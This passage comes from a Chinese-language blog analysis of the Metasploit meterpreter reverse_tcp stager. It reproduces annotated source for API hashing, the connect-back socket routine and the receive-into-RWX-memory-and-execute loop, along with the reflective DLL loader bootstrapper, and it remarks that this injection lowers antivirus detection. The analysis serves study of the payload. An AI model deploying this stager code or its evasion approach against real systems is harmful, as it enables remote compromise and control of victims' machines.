      ;</span><br><span class="line">      jecxz get_next_mod        ; 当我们到达EAT的开始(向后搜索)时，处理下一个模块</span><br><span class="line">      dec ecx                   ; 递减函数名称计数器</span><br><span class="line">      mov esi, [ebx+ecx*<span class="number">4</span>]      ; 获取下一个模块名称的rva</span><br><span class="line">      add esi, edx              ; 相加模块基址</span><br><span class="line">      xor edi, edi              ; 清除EDI，它将存储函数名的散列</span><br><span class="line">      ; 把它和我们想要的相比较</span><br><span class="line">    <span class="symbol">loop_funcname:</span>              ;</span><br><span class="line">      lodsb                     ; 读取ASCII函数名的下一个字节</span><br><span class="line">      ror edi, <span class="number">13</span>               ; 向右旋转哈希值</span><br><span class="line">      add edi, eax              ; 添加名称的下一个字节</span><br><span class="line">      cmp al, ah                ; 比较AL(名称中的下一个字节)和AH (null)</span><br><span class="line">      jne loop_funcname         ; 如果还没有到达空终止符，请继续</span><br><span class="line">      add edi, [ebp-<span class="number">8</span>]          ; 将当前模块哈希添加到函数哈希中</span><br><span class="line">      cmp edi, [ebp+<span class="number">36</span>]         ; 将散列与searchnig查找的散列进行比较</span><br><span class="line">      jnz get_next_func         ; 去计算下一个函数哈希如果我们还没有找到它</span><br><span class="line"></span><br><span class="line">      ; 如果找到，修复堆栈，调用函数，然后计算下一个函数的值...</span><br><span class="line">      pop eax                   ; 恢复当前模块EAT</span><br><span class="line">      mov ebx, [eax+<span class="number">36</span>]         ; 获取序数表rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov cx, [ebx+<span class="number">2</span>*ecx]       ; 按顺序得到所需的函数</span><br><span class="line">      mov ebx, [eax+<span class="number">28</span>]         ; 获取函数地址表rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov eax, [ebx+<span class="number">4</span>*ecx]      ; 得到所需的函数RVA</span><br><span class="line">      add eax, edx              ; 相加模块基址以获得实际的函数VA</span><br><span class="line">      ; 现在，我们修复堆栈并执行对所需函数的调用...</span><br><span class="line">    <span class="symbol">finish:</span></span><br><span class="line">      mov [esp+<span class="number">36</span>], eax         ; 用即将到来的popad所需的api地址覆盖旧的EAX值</span><br><span class="line">      pop ebx                   ; 清除当前模块散列</span><br><span class="line">      pop ebx                   ; 清除模块列表中的当前位置</span><br><span class="line">      popad                     ; 恢复所有的调用者寄存器</span><br><span class="line">      pop ecx                   ; 弹出调用者将推送的原始返回地址</span><br><span class="line">      pop edx                   ; 弹出调用者将推送的散列值</span><br><span class="line">      push ecx                  ; 返回正确的返回值</span><br><span class="line">      jmp eax                   ; 跳转到所需的函数</span><br><span class="line">      ; 现在我们自动返回到正确的调用者...</span><br><span class="line"></span><br><span class="line">    <span class="symbol">get_next_mod:</span>               ;</span><br><span class="line">      pop edi                   ; 关闭当前(现在前面的)模块EAT</span><br><span class="line">    <span class="symbol">get_next_mod1:</span>              ;</span><br><span class="line">      pop edi                   ; 弹出当前(现在是以前的)模块散列</span><br><span class="line">      pop edx                   ; 恢复我们在模块列表中的位置</span><br><span class="line">      mov edx, [edx]            ; 获取下一个模块</span><br><span class="line">      jmp.i8 next_mod           ; 下一个模块</span><br><span class="line">    ^</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>接下来我们对<code>asm_reverse_tcp</code>函数的全部源码进行分析，首先该函数获取了LoadLibrary函数地址并加载ws2_32模块，此模块中实现了很多网络相关的API，由于我们使用的<code>payload</code>为<code>reverse_tcp</code>所以可以推断接下来应该会创建tcp连接并且主动连接攻击机，可以推断创建反向tcp连接的步骤大致为如下<code>WSAStartup-&gt;socket-&gt;bind-&gt;connect-&gt;send-&gt;recv</code>，接下来我们来阅读<code>asm_reverse_tcp</code>函数源码主要逻辑就是创建反向tcp连接的过程，注意有个重试计数<code>0xA</code>，如果重试连接<code>0xA</code>次还是连接失败将会调用ExitProcess函数退出进程</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    retry_count  = [opts[<span class="symbol">:retry_count</span>].to_i, <span class="number">1</span>].max</span><br><span class="line">    encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">    encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line"></span><br><span class="line">    addr_fam      = <span class="number">2</span></span><br><span class="line">    sockaddr_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    asm = %Q^</span><br><span class="line">      ; 输入<span class="symbol">:EBP</span>必须是<span class="string">'api_call'</span>的地址.</span><br><span class="line">      ; 输出<span class="symbol">:EDI</span>将是连接到服务器的套接字</span><br><span class="line">      ; <span class="symbol">Clobbers:</span> EAX、ESI、EDI、ESP也将被修改(-<span class="number">0x1A0</span>)</span><br><span class="line"></span><br><span class="line">      <span class="symbol">reverse_tcp:</span></span><br><span class="line">        push <span class="string">'32'</span>               ; 将字节<span class="string">'ws2_32'</span>(<span class="number">0</span>,<span class="number">0</span>)压入堆栈。</span><br><span class="line">        push <span class="string">'ws2_'</span>             ; ...</span><br><span class="line">        push esp                ; 将指针推到堆栈上的“ws2_32”字符串.</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')&#125;</span></span><br><span class="line">        mov eax, ebp</span><br><span class="line">        call eax                ; LoadLibraryA( <span class="string">"ws2_32"</span> )</span><br><span class="line"></span><br><span class="line">        mov eax, <span class="number">0x0190</span>         ; EAX = sizeof( struct WSAData )</span><br><span class="line">        sub esp, eax            ; 为WSAData结构分配一些空间</span><br><span class="line">        push esp                ; 将指针指向这个结构体</span><br><span class="line">        push eax                ; 压栈wVersionRequested参数</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')&#125;</span></span><br><span class="line">        call ebp                ; WSAStartup( <span class="number">0x0190</span>, &amp;WSAData );</span><br><span class="line"></span><br><span class="line">      <span class="symbol">set_address:</span></span><br><span class="line">        push <span class="comment">#&#123;retry_count&#125;     ; 重试计数</span></span><br><span class="line"></span><br><span class="line">      <span class="symbol">create_socket:</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_host&#125;    ; 主机采用little-endian格式</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_port&#125;    ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp            ; 保存指向sockaddr结构体的指针</span><br><span class="line"></span><br><span class="line">        push eax                ; 如果我们成功了，eax将为零, push zero <span class="keyword">for</span> the flags param.</span><br><span class="line">        push eax                ; 保留参数push null</span><br><span class="line">        push eax                ; 我们不指定WSAPROTOCOL_INFO结构</span><br><span class="line">        push eax                ; 我们不指定协议</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push SOCK_STREAM</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push AF_INET</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')&#125;</span></span><br><span class="line">        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line">        xchg edi, eax           ; 将套接字保存以后，不要关心eax的值</span><br><span class="line">    ^</span><br><span class="line">    <span class="comment"># 检查是否指定了绑定端口</span></span><br><span class="line">    <span class="keyword">if</span> opts[<span class="symbol">:bind_port</span>]</span><br><span class="line">      bind_port    = opts[<span class="symbol">:bind_port</span>]</span><br><span class="line">      encoded_bind_port = <span class="string">"0x%.8x"</span> % [bind_port.to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        xor eax, eax</span><br><span class="line">        push <span class="number">11</span></span><br><span class="line">        pop ecx</span><br><span class="line">        <span class="symbol">push_0_loop:</span></span><br><span class="line">        push eax               ; 如果我们成功了，eax将为零, push it enough times</span><br><span class="line">                               ; 以同时满足IPv4和IPv6</span><br><span class="line">        loop push_0_loop</span><br><span class="line"></span><br><span class="line">                         ; bind to <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>/[<span class="symbol">:</span><span class="symbol">:</span>], pushed above </span><br><span class="line">        push <span class="comment">#&#123;encoded_bind_port&#125;   ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp           ; 保存指向sockaddr_in结构体的指针</span><br><span class="line">        push <span class="comment">#&#123;sockaddr_size&#125;  ; sockaddr_in结构体的长度(我们只设置了前8个字节，其余的不使用)</span></span><br><span class="line">        push esi               ; 指向sockaddr_in结构体的指针</span><br><span class="line">        push edi               ; socket</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'bind')&#125;</span></span><br><span class="line">        call ebp               ; bind( s, &amp;sockaddr_in, <span class="number">16</span> );</span><br><span class="line">        push <span class="comment">#&#123;encoded_host&#125;    ; 主机采用little-endian格式</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_port&#125;    ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">try_connect:</span></span><br><span class="line">        push <span class="number">16</span>                 ; sockaddr结构的长度</span><br><span class="line">        push esi                ; 指向sockaddr结构体的指针</span><br><span class="line">        push edi                ; the socket</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'connect')&#125;</span></span><br><span class="line">        call ebp                ; connect( s, &amp;sockaddr, <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line">        test eax,eax            ; 非零意味着失败</span><br><span class="line">        jz connected</span><br><span class="line"></span><br><span class="line">      <span class="symbol">handle_connect_failure:</span></span><br><span class="line">        ; 减少我们的尝试计数，然后再试一次</span><br><span class="line">        dec dword [esi+<span class="number">8</span>]</span><br><span class="line">        jnz try_connect</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> opts[<span class="symbol">:exitfunk</span>]</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">failure:</span></span><br><span class="line">        call exitfunk</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">failure:</span></span><br><span class="line">        push <span class="number">0x56A2B5F0</span>         ; 硬编码为exitprocess的大小</span><br><span class="line">        call ebp</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      ; 此标签是必需的，以便重新连接的尝试包括</span><br><span class="line">      ; the UUID stuff <span class="keyword">if</span> required.</span><br><span class="line">      <span class="symbol">connected:</span></span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; asm_send_uuid <span class="keyword">if</span> include_send_uuid</span><br><span class="line"></span><br><span class="line">    asm</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>我们走到第一次<code>recv</code>函数后的<code>VirtualAlloc</code>函数处，函数的dwsize参数为<code>recv</code>函数第一次接收到的</p>
+<img src="/Internals_meterpreter_payload/7.jpg" title="图7">
+<p>我们使用<code>WireShark</code>分析数据包，由于抓到的数据太多了根据我们配置的<code>payload</code>使用<code>tcp.port == 6666</code>进行过滤</p>
+<img src="/Internals_meterpreter_payload/8.jpg" title="图8">
+<p>我们分析过滤后的数据包找到攻击机首次发送的数据包，可以发现大小为4字节，和<code>recv</code>接收到的大小相同，我们看看接收到的内容<code>0x2be43</code>，对比下<code>VirtualAlloc</code>函数的<code>dwSize</code>参数发现完全相同</p>
+<img src="/Internals_meterpreter_payload/9.jpg" title="图9">
+<p>我们分析第二次接收的数据stage，熟悉PE结构的人看到<code>4D5A</code>标志应该都应该会推断这是一个PE文件，但是dos头除了MZ标志之外dos头其他的字段被修改成了一段硬编码，可以看到<code>E8 00000000</code>GetPC操作，可见stage头部被修改成为了一段<code>bootstrapper</code></p>
+<img src="/Internals_meterpreter_payload/10.jpg" title="图10">
+<p>接下来我们分析对应的源码<code>asm_block_recv</code>函数，根据函数名可知此函数主要就是负责接收来自攻击机发送的各种payload，主要流程首先<code>recv</code>接受4字节的<code>stage</code>大小，然后<code>VirtualAlloc</code>一块<code>RWX</code>属性的缓冲区大小为第一次recv接收的4字节<code>stage size</code>，然后再循环接收全部<code>stage</code>，如果<code>stage</code>全部接收成功则<code>ret</code>到<code>stage</code>执行，如果失败就使用<code>VirtualFree</code>释放内存并关闭<code>socket</code>，然后进行重试计数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span><br><span class="line">def asm_block_recv(opts=&#123;&#125;)</span><br><span class="line">    reliable     = opts[:reliable]</span><br><span class="line">    asm = %Q^</span><br><span class="line">      recv:</span><br><span class="line">        ; 接收传入第二阶段的大小...</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push 4                  ; length = sizeof( DWORD );</span><br><span class="line">        push esi                ; 堆栈上的4字节缓冲区，用于保存第二阶段长度</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, &amp;dwLength, 4, 0 );</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if reliable</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        ; reliability: 检查recv是否工作，并重新连接</span><br><span class="line">        ; if it fails</span><br><span class="line">        cmp eax, 0</span><br><span class="line">        jle cleanup_socket</span><br><span class="line">      ^</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">        ; 为第二阶段分配一个RWX缓冲区</span><br><span class="line">        mov esi, [esi]          ; dereference the pointer to the second stage length</span><br><span class="line">        push 0x40               ; PAGE_EXECUTE_READWRITE</span><br><span class="line">        push 0x1000             ; MEM_COMMIT</span><br><span class="line">        push esi                ; 压栈新接收的第二阶段长度.</span><br><span class="line">        push 0                  ; NULL as we dont care where the allocation is.</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, &apos;VirtualAlloc&apos;)&#125;</span><br><span class="line">        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">        ; 接收第二个阶段并执行它...</span><br><span class="line">        xchg ebx, eax           ; ebx = 新内存地址为新stage</span><br><span class="line">        push ebx                ; 压栈新stage地址，这样我们就可以return到新stage了</span><br><span class="line"></span><br><span class="line">      read_more:</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push esi                ; length</span><br><span class="line">        push ebx                ; the current address into our second stage&apos;s RWX buffer.</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, buffer, length, 0 );</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if reliable</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        ; reliability: 检查recv是否工作，然后重新连接</span><br><span class="line">        ; if it fails</span><br><span class="line">        cmp eax, 0</span><br><span class="line">        jge read_successful</span><br><span class="line"></span><br><span class="line">        ; 执行失败，释放内存</span><br><span class="line">        pop eax                 ; 获取payload的地址</span><br><span class="line">        push 0x4000             ; dwFreeType (MEM_DECOMMIT)</span><br><span class="line">        push 0                  ; dwSize</span><br><span class="line">        push eax                ; lpAddress</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, &apos;VirtualFree&apos;)&#125;</span><br><span class="line">        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)</span><br><span class="line"></span><br><span class="line">      cleanup_socket:</span><br><span class="line">        ; 清理 socket</span><br><span class="line">        push edi                ; socket handle</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;closesocket&apos;)&#125;</span><br><span class="line">        call ebp                ; closesocket(socket)</span><br><span class="line"></span><br><span class="line">        ; 将堆栈还原回连接重试计数</span><br><span class="line">        pop esi</span><br><span class="line">        pop esi</span><br><span class="line">        dec [esp]               ; 减量计数器</span><br><span class="line"></span><br><span class="line">        ; try again</span><br><span class="line">        jnz create_socket</span><br><span class="line">        jmp failure</span><br><span class="line">      ^</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      read_successful:</span><br><span class="line">        add ebx, eax            ; buffer += bytes_received</span><br><span class="line">        sub esi, eax            ; length -= bytes_received, will set flags</span><br><span class="line">        jnz read_more           ; continue if we have more to read</span><br><span class="line">        ret                     ; 回到第二阶段</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if opts[:exitfunk]</span><br><span class="line">      asm &lt;&lt; asm_exitfunk(opts)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>此时<code>eax</code>为最后一次recv接收的<code>stage</code>大小，<code>sub eax,esi</code>用来判断是否接收完全部<code>stage</code>，<code>esi</code>如果为0说明已经接收完全部<code>stage</code>，接下来的<code>ret</code>指令将转到此时栈顶的<code>stage</code>头部<code>bootstrapper</code>执行</p>
+<img src="/Internals_meterpreter_payload/11.jpg" title="图11">
+<p>我们使用<code>LordPE</code>的转存区域功能将整个<code>stage</code>dump下来</p>
+<img src="/Internals_meterpreter_payload/12.jpg" title="图12">
+<p>接着使用pe解析工具查看dump下来的pe文件发现了众多导出函数，我们看到了<code>ReflectiveLoader</code>这个导出函数，中文译为反射式注入，<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">ReflectiveLoader</a>是由HarmanySecurity的<a href="https://github.com/stephenfewer" target="_blank" rel="noopener">Stephen Fewer</a>提出的，可以判断stage头部<code>bootstrapper</code>的操作肯定会调用此导出函数实现反射式注入从内存直接加载stage，这种注入方式的优点是不会有文件落地，减少了杀毒软件查杀的几率，由于不使用<code>LoadLibrary</code>函数加载当我们使用<code>procexp</code>等工具在目标进程中查找不到此模块加载的痕迹，但是此注入方式需要申请大量的RWX内存，而且这些内存开头一般为PE文件的MZ标志</p>
+<img src="/Internals_meterpreter_payload/13.jpg" title="图13">
+<p>metasploit中存放此stage的位置在如下位置，可以看到此stage有x86版和x64版本的，除了此stage之后还有众多使用dll实现的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-payloads-1.3.65/data/meterpreter</span><br></pre></td></tr></table></figure>
+<img src="/Internals_meterpreter_payload/stagepath.jpg" title="stagepath">
+<p>图14为stage头部<code>bootstrapper</code>处逻辑，至此payload已经完全转移到了stage上执行，<code>4D</code>和<code>5A</code>分别对应<code>dec ebp</code>和<code>pop dex</code>这两条硬编码这两条汇编指令并没有实际用处只是为了保留dos头MZ标志，之后的<code>call next</code>和<code>pop ebx</code>为GetPC操作，接着平衡<code>dec ebp</code>和<code>pop dex</code>这两条汇编指令的操作，然后调用了GetPC操作获取的地址+偏移<code>0x1364</code>处的函数</p>
+<img src="/Internals_meterpreter_payload/14.jpg" title="图14">
+<p>接下来分析此<code>bootstrapper</code>对应的源码，我们可以看到和我们分析的大致相同，可以看到源码中说了GetPC操作+偏移处的函数就是<code>stage dll</code>中导出的<code>ReflectiveLoader</code>函数，可以看到了源码中还附有<code>ReflectiveLoader</code>函数的实现源码，待反射式注入函数执行完毕就以<code>DLL_METASPLOIT_ATTACH</code>为参数调用DllMain</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/meterpreter_loader.rb</span></span><br><span class="line"><span class="class"><span class="keyword">module</span> <span class="title">payload::Windows::MeterpreterLoader</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::ReflectiveDLLLoader</span><br><span class="line">  <span class="keyword">include</span> Msf::payload::Windows</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>(update_info(info,</span><br><span class="line">      <span class="string">'Name'</span>          =&gt; <span class="string">'Meterpreter &amp; Configuration RDI'</span>,</span><br><span class="line">      <span class="string">'Description'</span>   =&gt; <span class="string">'Inject Meterpreter &amp; the configuration stub via RDI'</span>,</span><br><span class="line">      <span class="string">'Author'</span>        =&gt; [ <span class="string">'sf'</span>, <span class="string">'OJ Reeves'</span> ],</span><br><span class="line">      <span class="string">'References'</span>    =&gt; [</span><br><span class="line">        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/stephenfewer/ReflectiveDLLInjection'</span> ], <span class="comment"># original</span></span><br><span class="line">        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/rapid7/ReflectiveDLLInjection'</span> ] <span class="comment"># customisations</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">'Platform'</span>      =&gt; <span class="string">'win'</span>,</span><br><span class="line">      <span class="string">'Arch'</span>          =&gt; ARCH_X86,</span><br><span class="line">      <span class="string">'payloadCompat'</span> =&gt; &#123; <span class="string">'Convention'</span> =&gt; <span class="string">'sockedi handleedi -https'</span>, &#125;,</span><br><span class="line">      <span class="string">'Stage'</span>         =&gt; &#123; <span class="string">'payload'</span>   =&gt; <span class="string">""</span> &#125;</span><br><span class="line">      ))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">asm_invoke_metsrv</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">    asm = %Q^</span><br><span class="line">        ; prologue</span><br><span class="line">          dec ebp               ; <span class="string">'M'</span></span><br><span class="line">          pop edx               ; <span class="string">'Z'</span></span><br><span class="line">          call $+<span class="number">5</span>              ; call <span class="keyword">next</span> instruction</span><br><span class="line">          pop ebx               ; 获取当前位置 (+<span class="number">7</span> bytes)</span><br><span class="line">          push edx              ; 恢复edx</span><br><span class="line">          inc ebp               ; 恢复ebp</span><br><span class="line">          push ebp              ; 保存ebp</span><br><span class="line">          mov ebp, esp          ; 开辟栈帧</span><br><span class="line">        ; 调用 ReflectiveLoader()</span><br><span class="line">          ; 将偏移量添加到 ReflectiveLoader() (0x????????)</span><br><span class="line">          add ebx, <span class="comment">#&#123;"0x%.8x" % (opts[:rdi_offset] - 7)&#125;</span></span><br><span class="line">          call ebx              ; 调用 ReflectiveLoader()</span><br><span class="line">        ; 调用 DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">          ; offset 